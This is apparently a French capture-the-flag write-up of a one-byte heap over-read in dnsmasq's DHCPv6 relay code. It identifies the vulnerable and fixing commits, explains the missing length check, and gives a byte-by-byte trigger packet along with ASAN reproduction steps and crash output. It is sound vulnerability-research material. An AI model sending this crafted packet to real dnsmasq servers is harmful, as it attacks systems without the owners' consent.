# VULN#002 — dnsmasq DHCPv6 relay

## Identification de la révision

La tarball fournie n'est pas la release 2.93 : c'est un snapshot git.
En comparant les hashes de tous les fichiers avec le dépôt amont, la révision
exacte est :

    c8168e8  2026-03-10 21:17:41 +0000
    "Don't call qsort() with a NULL array when no servers defined."

Le commit **immédiatement suivant**, 49 minutes plus tard, est le correctif :

    0597828  2026-03-10 22:06:50 +0000
    "Tighten length checking to avoid possible buffer read-overrun in DHCPv6."
    Thanks to Dejan Alvadzijevic for spotting the problem.

## La faille

Dans `src/rfc3315.c`, `dhcp6_maybe_relay()` :

    uint8_t *end = inbuff + sz;
    uint8_t *opts = inbuff + 34;
    int msg_type = *inbuff;          // aucune vérification sz >= 4

    ...
    /* must have at least ... 38 */
    if (sz < 38) return 0;

Un `RELAY-FORW` (type 12) contenant une option **Relay Message (code 9) de
longueur 0** est accepté. La récursion appelle alors `dhcp6_maybe_relay()` avec
`sz = 0` et un pointeur situé exactement sur la fin du paquet : la lecture
`*inbuff` se fait 1 octet après le buffer (heap-buffer-overflow read).

Correctif :

    if (sz < 4)
      return 0;
    msg_type = *inbuff;

(plus un `opt6_first()` pour le pointeur d'options initial).

Note : la lecture OOB de la boucle `opt6_next()` (option arrivant à `end-1`)
existe encore dans la version corrigée ; ce n'est donc pas le bug visé.

## Service

- TCP <HOST>:<PORT>
- framing : longueur 4 octets big-endian, puis paquet DHCPv6 brut
- validation : type 1..14, longueur max **4096** (au-delà : `bad length`)
- le paquet est passé à dnsmasq compilé avec ASAN ; le buffer fait exactement
  la taille maximale acceptée (4096). Un paquet plus court laisse du slack et
  ne déclenche rien (`status: no effect`).

## Packet déclencheur (4096 octets)

    offset 0   : 0c 00                     RELAY-FORW, hop 0
    offset 2   : 16 octets link-address = 0
    offset 18  : 16 octets peer-address = 0
    offset 34  : option type 2, len 4054, data 'C' * 4054
    offset 4092: option type 9, len 0      <-- Relay Message vide en fin de buffer

La récursion lit `*inbuff` à l'offset 4096 -> OOB d'1 octet.

## Reproduction locale

    git worktree add /tmp/opencode/dnsmasq-vuln c8168e8
    cd /tmp/opencode/dnsmasq-vuln
    make CFLAGS="-O1 -g -fsanitize=address" LDFLAGS="-fsanitize=address"

    # dnsmasq dans un netns, conf minimaliste DHCPv6 sur lo
    unshare -rn ./run_local2.sh ./src/dnsmasq zero4096.bin

Résultat version vulnérable :

    ERROR: AddressSanitizer: heap-buffer-overflow
    #0 dhcp6_maybe_relay src/rfc3315.c:115
    #1 dhcp6_maybe_relay src/rfc3315.c:255
    #2 dhcp6_reply      src/rfc3315.c:103

Version corrigée : aucun crash.

## Résultat

    status: confirmed
    FLAG: CTF{REDACTED}

Flag acceptée par la plateforme (`Correct`).
